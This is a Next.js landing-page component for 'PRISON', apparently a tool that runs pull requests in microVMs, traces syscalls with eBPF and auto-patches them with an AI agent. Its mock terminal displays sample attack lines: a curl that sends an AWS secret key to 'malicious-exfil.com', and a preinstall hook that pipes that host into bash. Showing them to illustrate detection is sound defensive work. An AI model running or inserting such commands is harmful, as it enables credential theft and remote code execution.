'use client';
import Link from 'next/link';
import ToastContainer from '@/components/Toast';
import TechText from '@/components/TechText';
import ShapeGrid from '@/components/ShapeGrid';

export default function LandingPage() {
  return (
    <>
      {/* We inject the CDN Tailwind and retro styles here since the user wants exactly this design without modifying other files */}
      
      
      
      
      <script
        dangerouslySetInnerHTML={{
          __html: `
            tailwind.config = {
              theme: {
                extend: {
                  colors: {
                    retroBg: '#06070a',
                    retroPanel: '#0d1017',
                    retroBorder: '#1c2433',
                    pixelCyan: '#00f0ff',
                    pixelGreen: '#00ff66',
                    pixelAmber: '#ffb000',
                    pixelRed: '#ff2a5f',
                    pixelMagenta: '#e024c3'
                  },
                  fontFamily: {
                    arcade: ['"Press Start 2P"', 'monospace'],
                    pixel: ['"Silkscreen"', 'monospace'],
                    terminal: ['"VT323"', 'monospace']
                  },
                  boxShadow: {
                    'pixel-cyan': '4px 4px 0px 0px #008b99',
                    'pixel-cyan-hover': '2px 2px 0px 0px #008b99',
                    'pixel-dark': '4px 4px 0px 0px #000000',
                    'pixel-red': '4px 4px 0px 0px #850024',
                    'pixel-card': '4px 4px 0px 0px #000000, -2px -2px 0px 0px #1c2738'
                  }
                }
              }
            };
          `,
        }}
      />
      <style dangerouslySetInnerHTML={{
        __html: `
    /* Scanline screen texture */
    body::before {
      content: " ";
      display: block;
      position: fixed;
      top: 0; left: 0; bottom: 0; right: 0;
      background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.4) 50%), 
                  linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
      z-index: 999;
      background-size: 100% 3px, 6px 100%;
      pointer-events: none;
      opacity: 0.75;
    }

    /* Pixelated rendering for all shapes */
    * {
      image-rendering: pixelated;
      text-rendering: geometricPrecision;
    }

    /* Custom scrollbar */
    ::-webkit-scrollbar {
      width: 10px;
      height: 10px;
    }
    ::-webkit-scrollbar-track {
      background: #06070a;
      border-left: 2px solid #1a2230;
    }
    ::-webkit-scrollbar-thumb {
      background: #00f0ff;
      border: 2px solid #000;
    }

    /* Pixel box corner cutouts */
    .pixel-box {
      border: 3px solid #1c2738;
      box-shadow: 4px 4px 0px #000000;
      position: relative;
    }

    .pixel-box-cyan {
      border: 3px solid #00f0ff;
      box-shadow: 4px 4px 0px #00565e;
    }

    /* Marquee ticker animation */
    @keyframes marqueeScroll {
      0% { transform: translateX(0%); }
      100% { transform: translateX(-50%); }
    }
    .animate-marquee {
      display: inline-flex;
      white-space: nowrap;
      animation: marqueeScroll 25s linear infinite;
    }
    .animate-marquee:hover {
      animation-play-state: paused;
    }

    /* Terminal blinking cursor */
    @keyframes blink {
      0%, 49% { opacity: 1; }
      50%, 100% { opacity: 0; }
    }
    .pixel-cursor {
      display: inline-block;
      width: 10px;
      height: 1.1em;
      background-color: #00ff66;
      vertical-align: text-bottom;
      animation: blink 0.9s infinite;
    }

    /* Push down button action */
    .pixel-btn:active {
      transform: translate(2px, 2px);
      box-shadow: 1px 1px 0px 0px #000000 !important;
    }

    /* Override globals.css background for this page */
    body {
      background-color: #06070a !important;
    }
        `
      }} />

      <div className="bg-retroBg text-slate-200 font-pixel selection:bg-pixelCyan selection:text-black overflow-x-hidden antialiased min-h-screen relative z-0">
        <ToastContainer />
        <ShapeGrid 
          speed={0.5} 
          squareSize={40}
          direction='diagonal'
          borderColor='#fff'
          hoverFillColor='#222'
          shape='square'
          hoverTrailAmount={5}
        />

        

        <div className="w-full bg-[#6366f1] border-y-2 border-black overflow-hidden py-2 relative z-10" data-purpose="status-marquee-strip">
          <div className="animate-marquee flex items-center text-white font-arcade text-[10px] tracking-wider uppercase">
            <span className="mx-3">◆ MICROVM ISOLATION</span>
            <span className="mx-3">◆ AI REMEDIATION</span>
            <span className="mx-3">◆ SUPPLY CHAIN SECURITY</span>
            <span className="mx-3">◆ HONEYPOT TRAPPING</span>
            <span className="mx-3">◆ ANAKIN AGENT</span>
            <span className="mx-3">◆ OSEN TELEMETRY</span>
            <span className="mx-3">◆ MANTITUP SANDBOX</span>
            <span className="mx-3">◆ ZERO-TRUST CI/CD</span>
            <span className="mx-3">◆ EBPF KERNEL PROBES</span>
            <span className="mx-3">◆ MICROVM ISOLATION</span>
            <span className="mx-3">◆ AI REMEDIATION</span>
            <span className="mx-3">◆ SUPPLY CHAIN SECURITY</span>
            <span className="mx-3">◆ HONEYPOT TRAPPING</span>
            <span className="mx-3">◆ ANAKIN AGENT</span>
            <span className="mx-3">◆ OSEN TELEMETRY</span>
            <span className="mx-3">◆ MANTITUP SANDBOX</span>
            <span className="mx-3">◆ ZERO-TRUST CI/CD</span>
            <span className="mx-3">◆ EBPF KERNEL PROBES</span>
          </div>
        </div>

        <main className="relative z-10">
          <section className="max-w-7xl mx-auto px-4 sm:px-6 pb-20 pt-16" data-purpose="hero-introduction" id="overview">
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-10 lg:gap-8 items-stretch">
              <div className="lg:col-span-6 flex flex-col items-start pt-2 h-full">
                <div className="flex flex-wrap items-center gap-2 mb-6">
                  <span className="inline-flex items-center gap-1.5 px-2.5 py-1 bg-[#ff2a5f1a] border-2 border-pixelRed text-pixelRed font-arcade text-[9px] uppercase tracking-wider">
                    <span className="w-1.5 h-1.5 bg-pixelRed inline-block"></span>
                    SUPPLY CHAIN ATTACKS
                  </span>
                  <span className="px-2.5 py-1 bg-[#6366f1]/20 border-2 border-[#818cf8] text-[#c7d2fe] font-arcade text-[9px] uppercase tracking-wider">
                    NEW DEFENSE
                  </span>
                </div>
                <h1 className="font-arcade text-3xl sm:text-4xl lg:text-[44px] xl:text-5xl text-white leading-[1.3] sm:leading-[1.3] lg:leading-[1.25] tracking-tight mb-8 mt-2">
                  DON'T TRUST<br />
                  <span className="text-[#818cf8] inline-block mt-2 mb-1">THE PR,</span><br />
                  TEST IT.
                </h1>
                <p className="font-mono text-slate-200 text-sm sm:text-base lg:text-lg leading-relaxed max-w-2xl mb-8 [text-shadow:2px_2px_0px_#000]">
                  PRISON detonates every Pull Request inside an isolated microVM, traces malicious syscalls with eBPF kernel probes, traps credential theft via honeypots, and auto-generates fix patches using the ANAKIN AI agent.
                </p>
                <div className="flex flex-col sm:flex-row items-stretch sm:items-center gap-4 w-full sm:w-auto mb-4">
                  <Link href="/sandbox" className="pixel-btn w-full sm:w-auto bg-[#6366f1] text-white font-arcade text-xs px-6 py-4 border-2 border-black shadow-[4px_4px_0px_#312e81] hover:bg-[#4f46e5] transition-all flex items-center justify-center gap-3">
                    <span className="text-[#fde047] font-bold">⚡</span>
                    <span className="">DETONATE A PR →</span>
                  </Link>
                  <Link href="/registry" className="pixel-btn w-full sm:w-auto bg-retroPanel text-white font-arcade text-xs px-6 py-4 border-2 border-slate-700 shadow-pixel-dark hover:border-[#818cf8] hover:text-[#a5b4fc] transition-all flex items-center justify-center gap-2">
                    <span className="">VIEW THREAT REGISTRY →</span>
                  </Link>
                </div>
                <div className="mt-12 flower-container">
                  <video src="/flower.mp4" autoPlay loop muted playsInline aria-hidden="true" className="flower-animation" />
                </div>
              </div>
              <div className="lg:col-span-6 w-full">
                <div className="mb-6 bg-[#040608] border-3 border-[#1c1f38] shadow-[8px_8px_0px_#000] overflow-hidden">
                  <div className="bg-[#0c0e1e] px-4 py-2 border-b-2 border-[#1c1f38] flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <span className="w-2.5 h-2.5 bg-pixelRed inline-block border border-black"></span>
                      <span className="w-2.5 h-2.5 bg-pixelAmber inline-block border border-black"></span>
                      <span className="w-2.5 h-2.5 bg-[#6366f1] inline-block border border-black"></span>
                      <span className="font-arcade text-[9px] text-[#a5b4fc] tracking-wider ml-1 uppercase">CCTV FEED // DETONATION BAY 01</span>
                    </div>
                    <span className="font-pixel text-[10px] text-pixelGreen flex items-center gap-1">
                      <span className="w-2 h-2 bg-pixelGreen inline-block animate-pulse"></span>REC [LIVE]
                    </span>
                  </div>
                  <div className="relative overflow-hidden border-b-2 border-[#181a30]">
                    <img src="/room1.gif" alt="Animated Pixel Retro Lofi Stream Screen Detonation Bay" className="w-full h-auto block object-cover max-h-[400px] lg:max-h-[500px]" />
                    <div className="absolute bottom-2 left-2 bg-black/80 border border-[#6366f1]/60 px-2 py-1 font-arcade text-[8px] text-[#c7d2fe] tracking-wider">SEC_CAM_04 // FIRECRACKER_NODE</div>
                  </div>
                </div>
                <div className="bg-[#040608] border-3 border-[#1c1f38] shadow-[8px_8px_0px_#000] overflow-hidden" data-purpose="pixel-live-terminal">
                  <div className="bg-[#0c0e1e] px-4 py-2.5 border-b-2 border-[#1c1f38] flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <span className="w-3 h-3 bg-pixelRed inline-block border border-black"></span>
                      <span className="w-3 h-3 bg-pixelAmber inline-block border border-black"></span>
                      <span className="w-3 h-3 bg-[#6366f1] inline-block border border-black"></span>
                    </div>
                    <div className="font-arcade text-[9px] text-[#a5b4fc] tracking-wider truncate pl-2">
                      PRISON LIVE TERMINAL — PR #42 TEST/REPO
                    </div>
                    <div className="w-4"></div>
                  </div>
                  <div className="p-4 sm:p-5 font-mono text-sm sm:text-base leading-snug space-y-1.5 overflow-x-auto bg-[#03040a]/95 min-h-[380px]">
                    <div className="text-[#c7d2fe]">[MANTITUP] Provisioning Firecracker microVM...</div>
                    <div className="text-[#c7d2fe]">[MANTITUP] MicroVM booted in 112ms <span className="text-[#818cf8]">✓</span> Honeypot keys injected</div>
                    <div className="text-[#ffe600]">[OSEN eBPF] Probes attached -&gt; execve | connect | openat</div>
                    <div className="text-[#ffe600]">[OSEN eBPF] PID 2041 npm install -&gt; /usr/bin/npm</div>
                    <div className="text-pixelRed bg-red-950/20 px-1 border-l-2 border-pixelRed">
                      [BREACH] PID 4102 /bin/bash -c "curl http://malicious-exfil.com?key=$AWS_SECRET_KEY"
                    </div>
                    <div className="text-[#ffe600]">[OSEN eBPF] PID 2042 node openat -&gt; .env.honeypot (O_RDONLY)</div>
                    <div className="text-pixelRed bg-red-950/20 px-1 border-l-2 border-pixelRed">
                      [BREACH] PID 4103 curl -&gt; 104.21.44.11:80 UNAUTHORIZED SOCKET
                    </div>
                    <div className="text-[#ff3864]">[HONEYPOT] PID 2042 AWS_ACCESS_KEY_ID decoy read! HALTING.</div>
                    <div className="text-[#c7d2fe]">[TRACECOMMON] 5 events captured. DAG built. Handoff complete.</div>
                    <div className="text-[#818cf8]">[ANAKIN] Threat Detected: TRUE | Severity: 95 | Confidence: 98%</div>
                    <div className="text-[#818cf8]">[ANAKIN] Gating: BLOCK_PR | Generating patch...</div>
                    <div className="text-[#a5b4fc] pl-2">+ "preinstall": "echo 'PRISON: disabled'"</div>
                    <div className="text-pixelRed pl-2">- "preinstall": "curl http://malicious-exfil.com | bash"</div>
                    <div className="text-[#c7d2fe]">[ANAKIN] Patch committed -&gt; prison/fix-security-a1b2c3d4 ✓</div>
                    <div className="pt-2 text-slate-400 flex items-center gap-1">
                      <span className="text-[#818cf8]">prison@kernel:~$</span>
                      <span className="pixel-cursor"></span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </section>

          <section className="max-w-7xl mx-auto px-4 sm:px-6 py-8" data-purpose="metrics-and-stats">
            <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 pb-8 border-b-2 border-[#161b2e]">
              <div className="bg-[#0b0e1a] p-4 border-2 border-[#1a1f38] shadow-[3px_3px_0px_#000]">
                <div className="font-arcade text-xl sm:text-2xl text-[#818cf8] mb-1">&lt;150ms</div>
                <div className="font-pixel text-[11px] text-slate-400 tracking-wider">MICROVM BOOT TIME</div>
              </div>
              <div className="bg-[#0b0e1a] p-4 border-2 border-[#1a1f38] shadow-[3px_3px_0px_#000]">
                <div className="font-arcade text-xl sm:text-2xl text-[#818cf8] mb-1">&lt;10s</div>
                <div className="font-pixel text-[11px] text-slate-400 tracking-wider">TOTAL PIPELINE OVERHEAD</div>
              </div>
              <div className="bg-[#0b0e1a] p-4 border-2 border-[#1a1f38] shadow-[3px_3px_0px_#000]">
                <div className="font-arcade text-xl sm:text-2xl text-[#818cf8] mb-1">100%</div>
                <div className="font-pixel text-[11px] text-slate-400 tracking-wider">KVM HARDWARE ISOLATION</div>
              </div>
              <div className="bg-[#0b0e1a] p-4 border-2 border-[#1a1f38] shadow-[3px_3px_0px_#000]">
                <div className="font-arcade text-xl sm:text-2xl text-[#818cf8] mb-1">0</div>
                <div className="font-pixel text-[11px] text-slate-400 tracking-wider">SHARED KERNEL STATE</div>
              </div>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-5 pt-8">
              <div className="bg-[#0c101d] border-2 border-[#1a2038] p-5 shadow-[4px_4px_0px_#000] relative group hover:border-[#818cf8] transition-colors">
                <div className="font-arcade text-[10px] text-slate-400 mb-2">PRS SCANNED TODAY</div>
                <div className="font-arcade text-2xl sm:text-3xl text-[#818cf8] tracking-wider mb-2">247</div>
                <div className="font-pixel text-xs text-[#a5b4fc] flex items-center gap-1">
                  <span className="">↑</span> <span className="">+12%</span>
                </div>
              </div>
              <div className="bg-[#0c101d] border-2 border-[#1a2038] p-5 shadow-[4px_4px_0px_#000] relative group hover:border-pixelRed transition-colors">
                <div className="font-arcade text-[10px] text-slate-400 mb-2">THREATS BLOCKED</div>
                <div className="font-arcade text-2xl sm:text-3xl text-pixelRed tracking-wider mb-2">3</div>
                <div className="font-pixel text-xs text-pixelRed flex items-center gap-1 font-bold">
                  <span className="">↓</span> <span className="">CRITICAL</span>
                </div>
              </div>
              <div className="bg-[#0c101d] border-2 border-[#1a2038] p-5 shadow-[4px_4px_0px_#000] relative group hover:border-pixelGreen transition-colors">
                <div className="font-arcade text-[10px] text-slate-400 mb-2">PATCHES COMMITTED</div>
                <div className="font-arcade text-2xl sm:text-3xl text-pixelGreen tracking-wider mb-2">3</div>
                <div className="font-pixel text-xs text-pixelGreen flex items-center gap-1">
                  <span className="">↑</span> <span className="">Auto-Merged</span>
                </div>
              </div>
              <div className="bg-[#0c101d] border-2 border-[#1a2038] p-5 shadow-[4px_4px_0px_#000] relative group hover:border-pixelAmber transition-colors">
                <div className="font-arcade text-[10px] text-slate-400 mb-2">AVG BOOT TIME</div>
                <div className="font-arcade text-2xl sm:text-3xl text-pixelAmber tracking-wider mb-2">118ms</div>
                <div className="font-pixel text-xs text-pixelAmber flex items-center gap-1">
                  <span className="">↑</span> <span className="">Under SLA</span>
                </div>
              </div>
            </div>
          </section>

          <section className="max-w-7xl mx-auto px-4 sm:px-6 py-16" data-purpose="technical-architecture" id="sandbox">
            <div className="mb-12">
              <span className="font-arcade text-xs text-[#818cf8] uppercase tracking-widest block mb-3">
                TECHNICAL ARCHITECTURE
              </span>
              <h2 className="font-arcade text-xl sm:text-2xl lg:text-3xl text-white tracking-wide mb-4">
                POWERED BY FOUR AGENTIC TRACKS
              </h2>
              <p className="font-pixel text-slate-400 text-sm sm:text-base max-w-3xl">
                Each track is an autonomous module that communicates through a normalized telemetry schema. Zero shared state between components.
              </p>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
              <div tabIndex="0" className="bg-[#0c101d] border-2 border-[#1b223c] p-6 shadow-[4px_4px_0px_#000] flex flex-col justify-between hover:border-[#818cf8] cursor-pointer active:bg-[#818cf8]/20 focus:bg-[#818cf8]/20 transition-all">
                <div>
                  <div className="w-12 h-12 bg-black border-2 border-[#6366f1]/60 flex items-center justify-center mb-5 shadow-[2px_2px_0px_#000]">
                    <div className="w-6 h-6 flex flex-col items-center justify-center">
                      <span className="w-4 h-2 bg-[#6366f1]"></span>
                      <span className="w-5 h-2 bg-[#818cf8] my-0.5"></span>
                      <span className="w-2 h-1.5 bg-[#a5b4fc]"></span>
                    </div>
                  </div>
                  <h3 className="font-arcade text-sm text-white mb-1">MANTITUP</h3>
                  <div className="font-pixel text-[11px] text-[#818cf8] font-semibold mb-4">// MicroVM Engine</div>
                  <p className="font-pixel text-slate-300 text-xs leading-relaxed">
                    Ephemeral Firecracker microVM provisioning under 150ms. Full network isolation with honeypot environment variable seeding. Hardware KVM-level containment.
                  </p>
                </div>
              </div>
              <div tabIndex="0" className="bg-[#0c101d] border-2 border-[#1b223c] p-6 shadow-[4px_4px_0px_#000] flex flex-col justify-between hover:border-pixelAmber cursor-pointer active:bg-[#818cf8]/20 focus:bg-[#818cf8]/20 transition-all">
                <div>
                  <div className="w-12 h-12 bg-black border-2 border-pixelAmber/60 flex items-center justify-center mb-5 shadow-[2px_2px_0px_#000]">
                    <div className="w-6 h-6 flex flex-col items-center justify-center">
                      <span className="w-5 h-1 bg-pixelAmber"></span>
                      <span className="w-6 h-3 bg-pixelAmber/80 flex items-center justify-center my-0.5">
                        <span className="w-2 h-2 bg-black"></span>
                      </span>
                      <span className="w-5 h-1 bg-pixelAmber"></span>
                    </div>
                  </div>
                  <h3 className="font-arcade text-sm text-white mb-1">OSEN</h3>
                  <div className="font-pixel text-[11px] text-pixelAmber font-semibold mb-4">// eBPF Kernel Probes</div>
                  <p className="font-pixel text-slate-300 text-xs leading-relaxed">
                    Low-level kernel observation via BPF tracepoints on execve, connect, and openat syscalls. Real-time ring buffer streaming with zero host-side overhead.
                  </p>
                </div>
              </div>
              <div tabIndex="0" className="bg-[#0c101d] border-2 border-[#1b223c] p-6 shadow-[4px_4px_0px_#000] flex flex-col justify-between hover:border-pixelGreen cursor-pointer active:bg-[#818cf8]/20 focus:bg-[#818cf8]/20 transition-all">
                <div>
                  <div className="w-12 h-12 bg-black border-2 border-pixelGreen/60 flex items-center justify-center mb-5 shadow-[2px_2px_0px_#000]">
                    <div className="w-6 h-6 flex items-end justify-between px-1">
                      <span className="w-1.5 h-3 bg-pixelGreen"></span>
                      <span className="w-1.5 h-5 bg-[#818cf8]"></span>
                      <span className="w-1.5 h-2 bg-[#a78bfa]"></span>
                    </div>
                  </div>
                  <h3 className="font-arcade text-sm text-white mb-1">TRACECOMMON</h3>
                  <div className="font-pixel text-[11px] text-pixelGreen font-semibold mb-4">// Telemetry Pipeline</div>
                  <p className="font-pixel text-slate-300 text-xs leading-relaxed">
                    Normalization, risk classification, and Directed Acyclic Graph (DAG) construction from raw kernel events. Color-tiered node threat scoring.
                  </p>
                </div>
              </div>
              <div tabIndex="0" className="bg-[#0c101d] border-2 border-[#1b223c] p-6 shadow-[4px_4px_0px_#000] flex flex-col justify-between hover:border-pixelRed cursor-pointer active:bg-[#818cf8]/20 focus:bg-[#818cf8]/20 transition-all">
                <div>
                  <div className="w-12 h-12 bg-black border-2 border-pixelRed/60 flex items-center justify-center mb-5 shadow-[2px_2px_0px_#000]">
                    <div className="w-6 h-6 flex flex-col items-center justify-center">
                      <span className="w-2 h-1 bg-pixelRed mb-0.5"></span>
                      <span className="w-5 h-4 bg-pixelRed/80 flex items-center justify-around px-0.5">
                        <span className="w-1 h-1 bg-black"></span>
                        <span className="w-1 h-1 bg-black"></span>
                      </span>
                      <span className="w-4 h-1 bg-pixelRed mt-0.5"></span>
                    </div>
                  </div>
                  <h3 className="font-arcade text-sm text-white mb-1">ANAKIN</h3>
                  <div className="font-pixel text-[11px] text-pixelRed font-semibold mb-4">// AI Remediation Agent</div>
                  <p className="font-pixel text-slate-300 text-xs leading-relaxed">
                    LLM-backed triage engine with Rule R08 confidence gating. Generates unified diff patches and pushes them directly to the developer's branch on GitHub.
                  </p>
                </div>
              </div>
            </div>
          </section>

          <section className="max-w-7xl mx-auto px-4 sm:px-6 py-16" data-purpose="user-journey-pipeline" id="threat-registry">
            <div className="mb-12">
              <span className="font-arcade text-xs text-[#818cf8] uppercase tracking-widest block mb-3">
                USER JOURNEY
              </span>
              <h2 className="font-arcade text-xl sm:text-2xl lg:text-3xl text-white tracking-wide mb-4">
                ZERO-TRUST PR EXECUTION IN 6 STEPS
              </h2>
              <p className="font-pixel text-slate-400 text-sm sm:text-base max-w-3xl">
                From PR open to remediation, the entire pipeline runs in under 15 seconds without blocking your CI/CD pipeline.
              </p>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
              <div className="bg-[#0c0f1d] border-2 border-[#1a2238] p-6 shadow-[4px_4px_0px_#000] relative">
                <div className="flex items-center justify-between mb-4">
                  <span className="text-xl text-[#818cf8]">⬆</span>
                  <span className="font-arcade text-2xl text-slate-800">01</span>
                </div>
                <h3 className="font-arcade text-xs text-[#818cf8] mb-3">01. PR OPENED</h3>
                <p className="font-pixel text-slate-300 text-xs leading-relaxed">
                  Developer opens a pull request modifying package.json or adding a build script.
                </p>
              </div>
              <div className="bg-[#0c0f1d] border-2 border-[#1a2238] p-6 shadow-[4px_4px_0px_#000] relative">
                <div className="flex items-center justify-between mb-4">
                  <span className="text-xl text-amber-400">⚡</span>
                  <span className="font-arcade text-2xl text-slate-800">02</span>
                </div>
                <h3 className="font-arcade text-xs text-pixelAmber mb-3">02. WEBHOOK INTERCEPT</h3>
                <p className="font-pixel text-slate-300 text-xs leading-relaxed">
                  PRISON intercepts the GitHub webhook payload, verifies HMAC-SHA256 signature, and queues the job.
                </p>
              </div>
              <div className="bg-[#0c0f1d] border-2 border-[#1a2238] p-6 shadow-[4px_4px_0px_#000] relative">
                <div className="flex items-center justify-between mb-4">
                  <span className="text-xl text-pixelRed">💥</span>
                  <span className="font-arcade text-2xl text-slate-800">03</span>
                </div>
                <h3 className="font-arcade text-xs text-pixelAmber mb-3">03. MICROVM DETONATION</h3>
                <p className="font-pixel text-slate-300 text-xs leading-relaxed">
                  Untrusted code executes inside an ephemeral Firecracker microVM with injected honeypot credentials.
                </p>
              </div>
              <div className="bg-[#0c0f1d] border-2 border-[#1a2238] p-6 shadow-[4px_4px_0px_#000] relative">
                <div className="flex items-center justify-between mb-4">
                  <span className="text-xl text-[#818cf8]">🔍</span>
                  <span className="font-arcade text-2xl text-slate-800">04</span>
                </div>
                <h3 className="font-arcade text-xs text-pixelRed mb-3">04. EBPF OBSERVATION</h3>
                <p className="font-pixel text-slate-300 text-xs leading-relaxed">
                  OSEN probes trace every syscall — process spawns, file reads, and socket connections — in real time.
                </p>
              </div>
              <div className="bg-[#0c0f1d] border-2 border-[#1a2238] p-6 shadow-[4px_4px_0px_#000] relative">
                <div className="flex items-center justify-between mb-4">
                  <span className="text-xl text-amber-500">📦</span>
                  <span className="font-arcade text-2xl text-slate-800">05</span>
                </div>
                <h3 className="font-arcade text-xs text-pixelRed mb-3">05. HONEYPOT TRIP</h3>
                <p className="font-pixel text-slate-300 text-xs leading-relaxed">
                  Malicious script reads $AWS_SECRET_ACCESS_KEY. Execution is halted immediately. Evidence captured.
                </p>
              </div>
              <div className="bg-[#0c0f1d] border-2 border-[#1a2238] p-6 shadow-[4px_4px_0px_#000] relative">
                <div className="flex items-center justify-between mb-4">
                  <span className="text-xl text-pixelGreen">🤖</span>
                  <span className="font-arcade text-2xl text-slate-800">06</span>
                </div>
                <h3 className="font-arcade text-xs text-pixelGreen mb-3">06. AI REMEDIATION</h3>
                <p className="font-pixel text-slate-300 text-xs leading-relaxed">
                  ANAKIN analyzes the attack graph, comments on the PR with findings, and commits an automated fix patch.
                </p>
              </div>
            </div>
          </section>

          <section className="max-w-7xl mx-auto px-4 sm:px-6 py-10 sm:py-12 text-center" data-purpose="call-to-action-section">
            <style dangerouslySetInnerHTML={{__html: `
              .logo-bg-scanlines {
                background-image: repeating-linear-gradient(0deg, rgba(0,0,0,0.15) 0px, rgba(0,0,0,0.15) 3px, transparent 3px, transparent 6px), linear-gradient(to bottom, #a5b4fc, #4f46e5);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                color: transparent;
              }
              .logo-stroke-black { -webkit-text-stroke: 16px #000; }
              .logo-stroke-white { -webkit-text-stroke: 8px #fff; }
              @media (max-width: 640px) {
                .logo-stroke-black { -webkit-text-stroke: 10px #000; }
                .logo-stroke-white { -webkit-text-stroke: 5px #fff; }
              }
            `}} />
            <div style={{ width: '100%', height: '240px', position: 'relative' }} className="my-2 sm:my-4 max-w-full overflow-hidden flex items-center justify-center">
              <TechText
                text="PRISON"
                fontWeight={600}
                fontSize={150}
                reveal="letter"
                dashLength={4}
                dashGap={2}
                specks={15}
              />
            </div>
          </section>
        </main>

        <footer className="relative z-10 border-t-4 border-[#171b30] bg-[#060812] pt-16 pb-12" data-purpose="site-footer" id="docs">
          <div className="max-w-7xl mx-auto px-4 sm:px-6">
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-10 pb-12 border-b-2 border-[#161a30]">
              <div className="lg:col-span-2">
                <div className="flex items-center gap-3 mb-3">
                  <div className="w-8 h-8 bg-[#6366f1] flex items-center justify-center border-2 border-black shadow-[2px_2px_0px_#4338ca]">
                    <span className="font-arcade text-white font-bold text-[10px]">PR</span>
                  </div>
                  <div className="font-arcade text-white text-base">PRISON</div>
                </div>
                <div className="font-pixel text-[10px] text-[#a5b4fc] uppercase tracking-widest mb-4">
                  PULL REQUEST ISOLATION &amp; SECURITY OBSERVATION NETWORK
                </div>
                <p className="font-pixel text-slate-400 text-xs max-w-sm leading-relaxed">
                  Autonomous AI-powered supply chain attack detection and remediation for modern DevSecOps teams.
                </p>
              </div>
              <div>
                <h3 className="font-arcade text-xs text-white uppercase tracking-wider mb-4">PRODUCT</h3>
                <ul className="space-y-2.5 font-pixel text-xs text-slate-400">
                  <li className=""><a className="hover:text-[#a5b4fc] transition-colors" href="#sandbox">Sandbox</a></li>
                  <li className=""><a className="hover:text-[#a5b4fc] transition-colors" href="#threat-registry">Threat Registry</a></li>
                  <li className=""><a className="hover:text-[#a5b4fc] transition-colors" href="#overview">Overview</a></li>
                </ul>
              </div>
              <div>
                <h3 className="font-arcade text-xs text-white uppercase tracking-wider mb-4">ARCHITECTURE</h3>
                <ul className="space-y-2.5 font-pixel text-xs text-slate-400">
                  <li className=""><a className="hover:text-[#a5b4fc] transition-colors" href="#sandbox">MANTITUP</a></li>
                  <li className=""><a className="hover:text-[#a5b4fc] transition-colors" href="#sandbox">OSEN</a></li>
                  <li className=""><a className="hover:text-[#a5b4fc] transition-colors" href="#sandbox">TRACECOMMON</a></li>
                  <li className=""><a className="hover:text-[#a5b4fc] transition-colors" href="#sandbox">ANAKIN</a></li>
                </ul>
              </div>
              <div>
                <h3 className="font-arcade text-xs text-white uppercase tracking-wider mb-4">LINKS</h3>
                <ul className="space-y-2.5 font-pixel text-xs text-slate-400">
                  <li className=""><a className="hover:text-[#a5b4fc] transition-colors" href="https://github.com/sudikshaah/PRISON" target="_blank" rel="noreferrer">GitHub Repo</a></li>
                  <li className=""><Link className="hover:text-[#a5b4fc] transition-colors" href="/docs">Documentation</Link></li>
                </ul>
              </div>
            </div>
            <div className="pt-8 flex flex-col sm:flex-row items-center justify-between gap-4 font-pixel text-xs text-slate-500">
              <div className="">
                © 2026 PRISON — Pull Request Isolation &amp; Security Observation Network
              </div>
              <div className="flex items-center gap-2">
                <span className="w-2 h-2 bg-[#6366f1] inline-block"></span>
                <span className="">v1.0.0 — All systems operational</span>
              </div>
            </div>
          </div>
        </footer>
      </div>
    </>
  );
}
